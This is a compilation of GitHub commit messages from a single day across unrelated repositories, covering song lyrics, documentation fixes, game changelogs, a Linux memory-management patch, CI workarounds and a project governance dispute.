Burn out the day
Burn out the night
I'm not the one to tell you what's wrong and what's right
I've seen suns that were freezing and lives that were through
But I'm burnin', I'm burnin', I'm burnin' for you
I'm burnin', I'm burnin', I'm burnin' for you ❤️‍🔥

Burn out the day
Burn out the night
I can't see no reason to put up a fight
I'm living for givin' the devil his due
And I'm burnin', I'm burnin', I'm burnin' for you
I'm burnin', I'm burnin', I'm burnin' for you
I'm burnin', I'm burnin', I'm burnin' for you
And I'm burnin', I'm burnin', I'm burnin' for you ❤️‍🔥

---
## [Danielkaas94/DTAP](https://github.com/Danielkaas94/DTAP)@[d245ba0d7b...](https://github.com/Danielkaas94/DTAP/commit/d245ba0d7b9ad1a120591d0df0d79ddd3aaa06d7)
#### Wednesday 2023-09-27 19:09:28 by Daniel Kaas Bundgaard Jørgensen

🤍🛡️🧠 Veteran of the Psychic Wars 🧠🛡️🤍

You see me now, a veteran
Of a thousand psychic wars
I've been living on the edge so long
Where the winds of limbo roar
And I'm young enough to look at
And far too old to see
All the scars are on the inside

I'm not sure if there's anything left of me

Don't let these shakes go on
It's time we had a break from it
It's time we had some leave
We've been living in the flames
We've been eating up our brains
Oh, please, don't let these shakes go on

You ask me why I'm weary
Why I can't speak to you
You blame me for my silence
Say it's time I changed and grew
But the war's still going on, dear
And there's no end that I know
And I can't say I'm forever

I can't say if we're ever gonna be free

Don't let these shakes go on
It's time we had a break from it
It's time we had some leave
We've been living in the flames
We've been eating up our brains
Oh, please, don't let these shakes go on

You see me now a veteran
Of a thousand psychic wars
My energy's spent at last
And my armor is destroyed
I have used up all my weapons
And I'm helpless and bereaved
Wounds are all I'm made of

Did I hear you say that this is victory?

Don't let these shakes go on
It's time we had a break from it
Send me to the rear
Where the tides of madness swell
And been sliding into Hell
Oh, please, don't let these shakes go on
Don't let these shakes go on
Don't let these shakes go on

---
## [Elabajaba/bevy](https://github.com/Elabajaba/bevy)@[44f677a38a...](https://github.com/Elabajaba/bevy/commit/44f677a38a6c99b8dcf79426d5b615a1266dde2d)
#### Wednesday 2023-09-27 19:12:29 by Sélène Amanita

Improve documentation relating to `Frustum` and `HalfSpace` (#9136)

# Objective

This PR's first aim is to fix a mistake in `HalfSpace`'s documentation.

When defining a `Frustum` myself in bevy_basic_portals, I realised that
the "distance" of the `HalfSpace` is not, as the current doc defines,
the "distance from the origin along the normal", but actually the
opposite of that.

See the example I gave in this PR.

This means one of two things:
1. The documentation about `HalfSpace` is wrong (it is either way
because of the `n.p + d > 0` formula given later anyway, which is how it
behaves, but in that formula `d` is indeed the opposite of the "distance
from the origin along the normal", otherwise it should be `n.p > d`)
2. The distance is supposed to be the "distance from the origin along
the normal" but when used in a Frustum it's used as the opposite, and it
is a mistake
3. Same as 2, but it is somehow intended

Since I think `HalfSpace` is only used for `Frustum`, and it's easier to
fix documentation than code, I assumed for this PR we're in case number
1. If we're in case number 3, the documentation of `Frustum` needs to
change, and in case number 2, the code needs to be fixed.

While I was at it, I also :
- Tried to improve the documentation for `Frustum`, `Aabb`, and
`VisibilitySystems`, among others, since they're all related to
`Frustum`.
- Fixed documentation about frustum culling not applying to 2d objects,
which is not true since https://github.com/bevyengine/bevy/pull/7885

## Remarks and questions

- What about a `HalfSpace` with an infinite distance, is it allowed and
does it represents the whole space? If so it should probably be
mentioned.
- I referenced the `update_frusta` system in
`bevy_render::view::visibility` directly instead of referencing its
system set, should I reference the system set instead? It's a bit
annoying since it's in 3 sets.
- `visibility_propagate` is not public for some reason, I think it
probably should be, but for now I only documented its system set, should
I make it public? I don't think that would count as a breaking change?
- Why is `Aabb` inserted by a system, with `NoFrustumCulling` as an
opt-out, instead of having it inserted by default in `PbrBundle` for
example and then the system calculating it when it's added? Is it
because there is still no way to have an optional component inside a
bundle?

---------

Co-authored-by: SpecificProtagonist <vincentjunge@posteo.net>
Co-authored-by: Alice Cecile <alice.i.cecile@gmail.com>

---
## [Poonamkota/Sales-Data-Analysis_Power-Bi-Dashboard](https://github.com/Poonamkota/Sales-Data-Analysis_Power-Bi-Dashboard)@[8a218b0a2e...](https://github.com/Poonamkota/Sales-Data-Analysis_Power-Bi-Dashboard/commit/8a218b0a2e0c6c3cde7eb7c82c0a835517ea2198)
#### Wednesday 2023-09-27 19:26:23 by Poonam Kota

Add files via upload

Meriskill Internship Project_HR Attrition Analysis Dashboard

Data Collection: Collected and meticulously cleaned extensive HR data.
Data Analysis: Applied advanced analytics techniques to reveal underlying patterns, trends, and correlations within the dataset. Used DAX formula to calculate KPI’s, add tables, and add new measures
Key Metrics: Computed vital HR metrics, encompassing female and male attrition based on employee roles, performance categorized by education field, marital status, job satisfaction ratings, and attrition across different salary slabs.

Insights and Recommendations:
Provided actionable recommendations derived from the data analysis, including strategies to mitigate attrition and enhance overall employee satisfaction.
Incorporated HR Metrics:
👥 Employee Count: Keep a real-time check on your organization's headcount.
🚪 Attrition Count: Track the number of employees leaving the company.
📉 Attrition Rate: Calculate attrition as a percentage of the total workforce.
🏢 Active Employees: Determine the number of currently employed individuals.
📆 Average Monthly Salary: Gain insights into the salary distribution across the workforce.
👥 Marital Status: Offers insights into employees' marital status.
😃 Job Satisfaction Rating: Evaluate employee satisfaction levels through surveys.
📊 Roles-Wise Attrition: Break down attrition data by specific roles for targeted interventions.
📊 Education field and gender-wise attrition: Understand attrition patterns based on education field and gender for more focused retention efforts.
Some of the Key insights include:
•	Married had the highest No. Employees at 673, followed by Single at 470 and Divorced at 327.  Married accounted for 45.78% of No. Employees.  
•	At 326, Sales Executive had the highest Total Employees Attrition and was 526.92% higher than Human Resources, which had the lowest Total Employees Attrition at 52.  
•	Across all 9 Job Role, Total Employees Attrition ranged from 52 to 326.  
•	Total No. of Attrition was higher for Male (882) than Female (588).  Life Sciences education filed shows the highest attrition by Gender made up 24.90% of No. of Attrition.  
•	Average No. of Attrition was higher for Male (147) than Female (98). 
•	Female Attrition and total Male Attrition are positively correlated with each other.  
•	Male Attrition and Female Attrition diverged the most when the Active Employees Roles was Lab Technician, when Male Attrition were 30 higher than Female Attrition.

---
## [Zonespace27/cmss13](https://github.com/Zonespace27/cmss13)@[9dbf819e8a...](https://github.com/Zonespace27/cmss13/commit/9dbf819e8a0512809c54ae8aae43749265a939bf)
#### Wednesday 2023-09-27 19:26:24 by forest2001

Codebook Optimisation (#4393)

# About the pull request
For as long as we've had a codebook it's been a pain in the arse to
read/synchronise from a staff POV. With this, codebooks will all share
the same codes per-faction.
<!-- Remove this text and explain what the purpose of your PR is.

Mention if you have tested your changes. If you changed a map, make sure
you used the mapmerge tool.
If this is an Issue Correction, you can type "Fixes Issue #169420" to
link the PR to the corresponding Issue number #169420.

Remember: something that is self-evident to you might not be to others.
Explain your rationale fully, even if you feel it goes without saying.
-->

# Explain why it's good for the game
Makes events that use codebooks actually viable.
# Testing Photographs and Procedure
<details>
<summary>Screenshots & Videos</summary>

Put screenshots and videos here with an empty line between the
screenshots and the `<details>` tags.

</details>


# Changelog
:cl:
add: Codebooks are now faction based rather than individually unique.
/:cl:

---
## [ninadpalsule/linux](https://github.com/ninadpalsule/linux)@[8b9c1cc041...](https://github.com/ninadpalsule/linux/commit/8b9c1cc0418a43196477083e7082568e7a4c9418)
#### Wednesday 2023-09-27 19:37:00 by David Hildenbrand

smaps: use vm_normal_page_pmd() instead of follow_trans_huge_pmd()

We shouldn't be using a GUP-internal helper if it can be avoided.

Similar to smaps_pte_entry() that uses vm_normal_page(), let's use
vm_normal_page_pmd() that similarly refuses to return the huge zeropage.

In contrast to follow_trans_huge_pmd(), vm_normal_page_pmd():

(1) Will always return the head page, not a tail page of a THP.

 If we'd ever call smaps_account with a tail page while setting "compound
 = true", we could be in trouble, because smaps_account() would look at
 the memmap of unrelated pages.

 If we're unlucky, that memmap does not exist at all. Before we removed
 PG_doublemap, we could have triggered something similar as in
 commit 24d7275ce279 ("fs/proc: task_mmu.c: don't read mapcount for
 migration entry").

 This can theoretically happen ever since commit ff9f47f6f00c ("mm: proc:
 smaps_rollup: do not stall write attempts on mmap_lock"):

  (a) We're in show_smaps_rollup() and processed a VMA
  (b) We release the mmap lock in show_smaps_rollup() because it is
      contended
  (c) We merged that VMA with another VMA
  (d) We collapsed a THP in that merged VMA at that position

 If the end address of the original VMA falls into the middle of a THP
 area, we would call smap_gather_stats() with a start address that falls
 into a PMD-mapped THP. It's probably very rare to trigger when not
 really forced.

(2) Will succeed on a is_pci_p2pdma_page(), like vm_normal_page()

 Treat such PMDs here just like smaps_pte_entry() would treat such PTEs.
 If such pages would be anonymous, we most certainly would want to
 account them.

(3) Will skip over pmd_devmap(), like vm_normal_page() for pte_devmap()

 As noted in vm_normal_page(), that is only for handling legacy ZONE_DEVICE
 pages. So just like smaps_pte_entry(), we'll now also ignore such PMD
 entries.

 Especially, follow_pmd_mask() never ends up calling
 follow_trans_huge_pmd() on pmd_devmap(). Instead it calls
 follow_devmap_pmd() -- which will fail if neither FOLL_GET nor FOLL_PIN
 is set.

 So skipping pmd_devmap() pages seems to be the right thing to do.

(4) Will properly handle VM_MIXEDMAP/VM_PFNMAP, like vm_normal_page()

 We won't be returning a memmap that should be ignored by core-mm, or
 worse, a memmap that does not even exist. Note that while
 walk_page_range() will skip VM_PFNMAP mappings, walk_page_vma() won't.

 Most probably this case doesn't currently really happen on the PMD level,
 otherwise we'd already be able to trigger kernel crashes when reading
 smaps / smaps_rollup.

So most probably only (1) is relevant in practice as of now, but could only
cause trouble in extreme corner cases.

Let's move follow_trans_huge_pmd() to mm/internal.h to discourage future
reuse in wrong context.

Link: https://lkml.kernel.org/r/20230803143208.383663-3-david@redhat.com
Fixes: ff9f47f6f00c ("mm: proc: smaps_rollup: do not stall write attempts on mmap_lock")
Signed-off-by: David Hildenbrand <david@redhat.com>
Acked-by: Mel Gorman <mgorman@techsingularity.net>
Cc: Hugh Dickins <hughd@google.com>
Cc: Jason Gunthorpe <jgg@ziepe.ca>
Cc: John Hubbard <jhubbard@nvidia.com>
Cc: Linus Torvalds <torvalds@linux-foundation.org>
Cc: liubo <liubo254@huawei.com>
Cc: Matthew Wilcox (Oracle) <willy@infradead.org>
Cc: Mel Gorman <mgorman@suse.de>
Cc: Paolo Bonzini <pbonzini@redhat.com>
Cc: Peter Xu <peterx@redhat.com>
Cc: Shuah Khan <shuah@kernel.org>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>

---
## [Hewdraw/clovermon-showdown](https://github.com/Hewdraw/clovermon-showdown)@[6d6f99c04b...](https://github.com/Hewdraw/clovermon-showdown/commit/6d6f99c04b6e701e667d1ceb17904f7a1540272f)
#### Wednesday 2023-09-27 19:48:42 by DeeGee22

Fixes a bunch of Wack moves

Villain Power
Why
Inverted Room
Mass Hysteria
Hellfire
Heaven's Hole
Paint Roller
Painting World
Whirl Paint
Siren Song
Blood Seal
Amber Wave
Dust Tornado
Dust Storm
Yata no Kagami
Bold Counter
Irate Trance
Venus Burst
Reverse Splash
Fabric World (including pitted rock increased duration)
Fabric Softener
Sewing (fabric world effect)
WINDRAGE
Spring Cleaning
Steam Clean (Untested)
Throat Heal (Untested)
Carpet Rub (untested)
Pull Wool
Focus Time
Hour Blast
Honor Bind
Arborium (added wooden rock increased duration)
Matter of Time
De-Age
Faith Charge
Fossilize
Fast Forward (Untested)
Minute Blast
Tic Toc
Time Freeze
Hat Spin
Terraform
Clearing Win
Wind Spin
Bowl Spin
Pirouette
Pizzaspin
Woodspin
Screw Attack
Kikenjo
Dust Blizzard
Sabbath
TeardropPhotonRay
Comet Rush
Isis Magic (fix)

---
## [j3camero/the-government](https://github.com/j3camero/the-government)@[9495055c95...](https://github.com/j3camero/the-government/commit/9495055c9551bda4b8188c883aebbc2b4681ec01)
#### Wednesday 2023-09-27 20:04:21 by Jeff Cameron

Urgent Security Fix

Last night Aperture (donatarigov) force-merged a code change, bypassing the vote-based system. This is the equivalent of Jeff right-click banning someone in Discord, bypassing the Ban Court.

This is his 2nd offense. The first time he did it I explained to him that even though he has admin access to the repo and can therefore force-merge any PR bypassing the voters, that this is a loophole and should not be done. This rules out that he somehow didn't know or realize. He knows damn well. None of the other voters have ever done this. They all know better. So does Aperture.

He did it in the dead of night, at 2:30 AM Eastern.

He himself was part of the original voters who agreed on a 24h minimum time to pass any code change. The time limit is enforced automatically by a GitHub Action that we installed called "democracy". Aperture abused his admin powers to bypass this system.

One of the first things we did after the vote-based system was installed was to set the 24h minimum. It stops people from passing a PR in the middle of the night. It creates a relaxed non-tactical atmosphere where voters get that guaranteed 24h to consider their vote, change their mind, suggest changes, etc. Just like the minimum timer in Ban Court. It stops 3 voters from banning someone in the dead of night.

Question from those who aren't familiar with GitHub: "could this have been a mistake? Maybe he unknowingly slipped up"
Answer: unfortunately it's not possible. When the automated checks including the vote system are all in a passing state, the Merge button turns bright green and gets larger. It's extremely salient. To bypass the voting system, he had had to click a small greyed out Merge button with a red X near it. He then had to click through a secondary warning that warns him the checks haven't passed yet. There's no possibility this was an accident.

Question: is this just pedantic rule enforcement? Does this actually matter?
Answer: Yes! The problem with someone who shows they won't respect the 24h minimum is he could pass a change that adds discord.delete() in the dead of night. 10 seconds later the change would be auto-deployed and the entire discord would be permanently deleted forever. By the time other voters got up in the morning to vote against the change, it would be too late. This is therefore an URGENT security matter.

---
## [juhuyoon/DemoDownload](https://github.com/juhuyoon/DemoDownload)@[265694b845...](https://github.com/juhuyoon/DemoDownload/commit/265694b845a00ab1dfc37c9e42856d05f884fb5a)
#### Wednesday 2023-09-27 20:24:32 by jyoon3

You are the love of my life. The first day I met you I knew you were the one. I will bring you breakfast in bed all day and I will work so that you can stay at home and do whatever you want. Please marry me.

---
## [syzygy-0/portfolio](https://github.com/syzygy-0/portfolio)@[aa0e9faa99...](https://github.com/syzygy-0/portfolio/commit/aa0e9faa99b465029e55aabf992123596d08fe54)
#### Wednesday 2023-09-27 21:02:32 by Chelsea Wright

Add files via upload

Boyfriend asked me to create a program to help pick dinner for night when we can't decide. It's a very simple script containing a list of dinners, and uses the random module to select one of the dinners

---
## [syzygy-0/portfolio](https://github.com/syzygy-0/portfolio)@[753575191b...](https://github.com/syzygy-0/portfolio/commit/753575191b68e6291d0e3da270dde996cf97a7ed)
#### Wednesday 2023-09-27 21:04:05 by Chelsea Wright

Add files via upload

Boyfriend asked me to create a program that can help select a dinner for us when we can't decide. It's a very simple program containing a list of possible dinners, and uses the random module to select from the list

---
## [ZerdoX-x/nushell](https://github.com/ZerdoX-x/nushell)@[fed4233db4...](https://github.com/ZerdoX-x/nushell/commit/fed4233db4d81de00068ffa7cf1c0d09506bc150)
#### Wednesday 2023-09-27 21:48:22 by David Matos

use uutils/coreutils cp command in place of nushell's cp command (#10097)

<!--
if this PR closes one or more issues, you can automatically link the PR
with
them by using one of the [*linking
keywords*](https://docs.github.com/en/issues/tracking-your-work-with-issues/linking-a-pull-request-to-an-issue#linking-a-pull-request-to-an-issue-using-a-keyword),
e.g.
- this PR should close #xxxx
- fixes #xxxx

you can also mention related issues, PRs or discussions!
-->

# Description
Hi. Basically, this is a continuation of the work that @fdncred started.
Given some nice discussions on #9463 , and [merged uutils
PR](https://github.com/uutils/coreutils/pull/5152) from @tertsdiepraam
we have decided to give the `cp` command the `crawl` stage as it was
named.

> [!NOTE] 
Given that the `uutils` crate has not made the release for the merged
PR, just make sure you checkout latest and put it in the required place
to make this PR work.

The aim of this PR is for is to see how to move forward using `uutils`
crate. In order to getting this started, I have made the current
`nushell cp tests` pass along with some extra ones I copied over from
the `uutils` repo.

With all of that being said, things that would be nice to decide, and
keep working on:

Crawl:
- Handling of certain `named` flags, with their long and short
forms(e.g. --update, --reflink, --preserve, etc), and using default
values. Maybe `-u` can already have a `default_missing_value`.
- Should we maybe just support one single option `switch` flags (see
`--backup` in code) as a contrast to the other named args.
- Complete test coverage from `uutils`. They had > 100 tests, and I
could only port like 12 as they are a bit time consuming given they
cannot be straight up copy pasted. Maybe we do not need all >100, but
maybe the more relevant to what we want.
- Refactor this code

Walk:
- Non fatal errors on `copy` from `utils`. Currently it just sends it to
stdout but errors have no span
- Better integration 

An added possibility is the addition of `SyntaxShape::OneOf()` for
`Named` arguments which was briefly mentioned in the discord server, but
that is still to be decided. This could greatly improve some of the
integration. This would enable something like `cp --preserve [all
timestamp]` or `cp --preserve all` to both work.

I did not want to keep holding on this, and wait till I was happy with
the code because I think its nice if everyone can start up and suggest
refactors, but the main important part now was getting it out the door,
as if I take my sweet time this will take way longer :stuck_out_tongue:

<!--
Thank you for improving Nushell. Please, check our [contributing
guide](../CONTRIBUTING.md) and talk to the core team before making major
changes.

Description of your pull request goes here. **Provide examples and/or
screenshots** if your changes affect the user experience.
-->

# User-Facing Changes
<!-- List of all changes that impact the user experience here. This
helps us keep track of breaking changes. -->

# Tests + Formatting

Make sure you've run and fixed any issues with these commands:

- [X] cargo fmt --all -- --check` to check standard code formatting
(`cargo fmt --all` applies these changes)
- [X] cargo clippy --workspace -- -D warnings -D clippy::unwrap_used` to
check that you're using the standard code style
- [X] cargo test --workspace` to check that all tests pass
- [X] cargo run -- -c "use std testing; testing run-tests --path
crates/nu-std"` to run the tests for the standard library

> **Note**
> from `nushell` you can also use the `toolkit` as follows
> ```bash
> use toolkit.nu # or use an `env_change` hook to activate it
automatically
> toolkit check pr
> ```
-->

# After Submitting
<!-- If your PR had any user-facing changes, update [the
documentation](https://github.com/nushell/nushell.github.io) after the
PR is merged, if necessary. This will help us keep the docs up to date.
-->

---------

Co-authored-by: Darren Schroeder <343840+fdncred@users.noreply.github.com>

---
## [atosti/tgstation](https://github.com/atosti/tgstation)@[b0ec1e4098...](https://github.com/atosti/tgstation/commit/b0ec1e4098ed80fdb0bac69c6f950bd5e38012b8)
#### Wednesday 2023-09-27 22:09:21 by Jacquerel

[no gbp] Adds missing chat feedback to watcher abilities (#77700)

## About The Pull Request

I kept meaning to add this in my last PR and kept thinking "I'll add
that in with these review changes" and then forgot every time. This
should make it clearer what is happening to you and why.

Also I made the gaze ability stun the user for a short period after it
goes off because them shooting you instantly after they stop channeling
_is_ sort of bullshit.
Also while testing this I noticed the AI interrupt one of its actions to
do the other one which is a bit silly so now it cannot do that.

## Why It's Good For The Game

Outlines in the log why something bad just happened to you.

## Changelog

:cl:
qol: Added some textual feedback to new watcher abilities
balance: Watchers will not attack for a short period following their
gaze attack
fix: Watchers won't interrupt one ability to use the other one
/:cl:

---
## [jkyros/keda](https://github.com/jkyros/keda)@[76d7cf1ef4...](https://github.com/jkyros/keda/commit/76d7cf1ef4ca15ad0d7467df8b23050ed39ed917)
#### Wednesday 2023-09-27 22:28:46 by John Kyros

UPSTREAM: <carry>: Initial hacks to get e2e working in OpenShift CI

* Allow privileged pods in OpenShift test namespaces

The way the e2e test suite is set up, there are several pods that are
to running with more privilege than our "restricted" SCC provides.
Long-term I don't think there is anything in here that *requires* the
privilege, but we'll need to do some testing and find out.

In the mean time, this injects an adjusted pod admission policy into
each test namespace via the centralized namespace creation helper
function so that those privileged pods can run in the test namespaces.

* Specify securityContext for privileged e2e pods

The e2e test suite here is used to running in a "vanilla kube"
environment that does not have OpenShift/OpenShift CI restrictions. This
becomes a problem when one of the test containers attempts to do
something privileged (like bind to a privileged port) and is denied.

This just adds securityContexts to the pods that require privilege so
that they can get assigned a proper SCC and successfully run. The
securityContext addition is limited to only the tests that OpenShift
runs (internal, sequential, cpu/memory/kafka scalers) because we haven't
tested the others.

* Allow e2e test image overrides for OpenShift CI

The e2e test suite references multiple images spread across multiple
public registries (ghcr.io,docker.io,k8s.io) and some of those
registries have pull limits, which will cause our tests to fail.

We also cache some of these upstream images in our CI system, and so it
is beneficial to be able to reference our cached copy rather than have
to pull it from "the internet" every time.

Anyway, the way that the e2e tests are set up, all those images are
hard-coded in each of the manifests, which are just vars that exist in
each test's .go file. They are not templated. There is, however a
central helper function that applies all these resources (using
kubectl).

So, in order for us to be able to override the image list for CI, this
temporarily:
- adds an image rewrite map that specifies replacement images for
  images we might have difficulty pulling
- adds a helper function that will let those replacement images be
  specified by environment variables for use in CI
until we can figure out a more elegant refactor.

* Account for OpenShift CI in Prometheus build test

There is a test in the prometheus sequential suite that checks the git
commit hash of the current code and compares it to the containers
running in the test to make sure that the test version matches the code
version.

This version is injected as GIT_COMMIT during the docker builds
in the Makefile, but it does not get injected when the containers are
build in OpenShift CI. I would like to find a way to inject it via CI,
but until then we are supplying a dummy string "dummy-ci-commit-value"
that is at least "yes you are running against a CI payload we built, and
not one that you pulled from upstream".

Eventually when we figure out how to make all the variables available in
CI and inject them, this can go away because then the commits will
match.

---
## [WonderingGodling/My-Mind-Space](https://github.com/WonderingGodling/My-Mind-Space)@[f9834ec961...](https://github.com/WonderingGodling/My-Mind-Space/commit/f9834ec96137d4e1dfbd253d38033ce64c7bb10c)
#### Wednesday 2023-09-27 22:50:13 by WonderingGodling

Update content src/site/notes/Skull/Concentrated Brain/Random Thoughts/One Day I Know That You Will Be There One day Ill Focus On The Future Maybe One Day Oh Baby Isnt Life So Fucking Inconsistent.md

---
## [Siigull/Chess-Challenge](https://github.com/Siigull/Chess-Challenge)@[3ed4ea300f...](https://github.com/Siigull/Chess-Challenge/commit/3ed4ea300f38776ed9694f5a2a1b31677d858c84)
#### Wednesday 2023-09-27 23:03:54 by Siigull

kinda functioning but fucked eval 1:7 against evil

---
## [russ-money/russ-station](https://github.com/russ-money/russ-station)@[25b1203a97...](https://github.com/russ-money/russ-station/commit/25b1203a971ab7091abbe75cacfce1ba28b62a78)
#### Wednesday 2023-09-27 23:14:37 by Jacquerel

You can do revival surgery on Ian (#78288)

## About The Pull Request

Allows you to perform revival surgery on any mob which is organic or
looks humanoid.
This means yes: Corgis, Goliaths, ~~Syndicate mobs~~ not those because
they spawn human corpses and delete themselves.
No: Slimes, Ghosts, General Beepsky.

Splits revival surgery into a subtype used for "mobs" and a subtype for
"mobs with brains" as the former don't have any brains to damage.

Additionally by special request, Ian can now wear an eyepatch and will
automatically put one on if he is brought back from death.

![image](https://github.com/tgstation/tgstation/assets/7483112/eff91bf6-4f80-4d8b-9062-1a5d4af85d39)

## Why It's Good For The Game

Currently you revive dead pets either by creating a magical reagent out
of holy water or by buying a mining item which also brainwashes them,
however reasonably our skilled medical team should be able to put a dog
back together and now can.
When you fuck up one of the stages of Tend Wounds on a kitten and stab
it to death with your scalpel, now you can fix it.
Expands the possibilities of vetinerary roleplay.

## Changelog

:cl:
add: Many kinds of mobs can now be brought back to life through revival
surgery.
add: Dogs can wear eyepatches.
/:cl:

---
## [Xeeynamo/sotn-decomp](https://github.com/Xeeynamo/sotn-decomp)@[7e48f91954...](https://github.com/Xeeynamo/sotn-decomp/commit/7e48f91954455137dc31eb820c99aa3666f728db)
#### Wednesday 2023-09-27 23:28:50 by bismurphy

PlayerState collider restructure (#643)

A recently decompiled function found that `s32 D_80072BD0[8][9]` was
actually an array of Collider. This PR updates that to be correct.

It looks like the struct member right after it should be grouped in to
have `colliders[22]` but for whatever reason that doesn't seem to work
so I'm leaving it. Given that the struct size matches and everything, we
probably have `colliders[8]` and then `colliders2[14]` but without more
evidence I don't want to mark this down yet.

Some of these lines come out pretty long like if
`((g_Player.colliders[1].effects & (EFFECT_SOLID_FROM_BELOW +
EFFECT_SOLID)) == EFFECT_SOLID ||`. Here is what that looks like after I
run the formatter:

![image](https://github.com/Xeeynamo/sotn-decomp/assets/15314202/833aa657-9e11-40e6-bbcf-5ec09f768f26)


Personally, I think the original code is a lot more readable since
everything is stacked up. You can see the [1][2][3] much more easily
than when the lines are interwoven with each other. This isn't the most
egregious example of lines being broken apart, but it's not ideal. I
think we should seriously talk about what we're going to do about the
80-column limit and how it impacts our work. It seems like people are
open to expanding it to 120 columns or something, which would help a
lot. Another alternative would be to remove `EFFECT_` from this enum so
we just have `SOLID_FROM_BELOW` and `SOLID_` (because right now, the
three instances of `EFFECT_` are eating 21 characters right away). We
need to either expand the limit, shrink the names, or be okay with our
code becoming ugly.

Anyway, if I should just run the formatter and call it good for now, let
me know, otherwise we can keep this PR staged as a "once we resolve the
column limit, then we put this one in".

---
## [psyonicinc/tensorflow_abh_demo](https://github.com/psyonicinc/tensorflow_abh_demo)@[86a7a69b5c...](https://github.com/psyonicinc/tensorflow_abh_demo/commit/86a7a69b5cc795b76579c3b620fb90e7da3e2c5f)
#### Wednesday 2023-09-27 23:30:22 by ocanath

actually works, kinda. stuttery. fucking hate matplotlib

---
## [tgstation/tgstation](https://github.com/tgstation/tgstation)@[e39a43e2a4...](https://github.com/tgstation/tgstation/commit/e39a43e2a418f19fde52e05281bfdae063f4a6c1)
#### Wednesday 2023-09-27 23:38:31 by Toastgoats

[No GBP] Fixes the secret bottomless pit in the ethereal pirate shuttle (#78138)

## About The Pull Request

I DIDNT NOTICE THAT ALL THE DIRT IN THE ETHEREAL SHUTTLE HAD CHASM
BASETURFS FUCK FUCK FUCK


![image](https://github.com/tgstation/tgstation/assets/63932673/ba5f7b02-7577-48ad-b2bc-b8b1c0e4192f)

(Also rebalances the ship a bit by adding some more turrets and cleans
up the wonky turf decals and engines)
## Why It's Good For The Game

God's strongest mapper needs to get some sleep asap I'm so fucking tired

A few people also pointed out that only having two turrets was extremely
punishing even for the playstyle I was trying to encourage, so it makes
sense to add a little wiggle room.
## Changelog
:cl:
balance: Gave the bluespace geode pirates 4 more teleporter bolt
turrets.
fix: The bluespace geode pirates no longer have a bluespace portal to
the bottomless pit dimension.
add: Station-safe dirt tiles for all your mapping needs, but surely no
station maps use the chasm baseturf ones, right? Right?
/:cl:

---
## [Lauro235/mswjs.io](https://github.com/Lauro235/mswjs.io)@[777a6a9bc9...](https://github.com/Lauro235/mswjs.io/commit/777a6a9bc9b8f8f3e739c0a032b5edd38d9227d1)
#### Wednesday 2023-09-27 23:59:07 by Lorentz

Included ES6 Alternative set up

Love MSW and the ideas behind it. The community seems pretty cool to 😎.

I believe my dev experience with MSW would have been better had something like this been included in the docs.

The set up described before this change caused errors for me. Nesting the import(path/to/browser.ts) did not behave in the same way that a require would, and `import * as name from` wasn't possible in an if condition.

While this change might not be crucial, I really think it will be helpful to new users coming to MSW.

Hope you can consider it. Happy to edit it if there are layout issues.

---

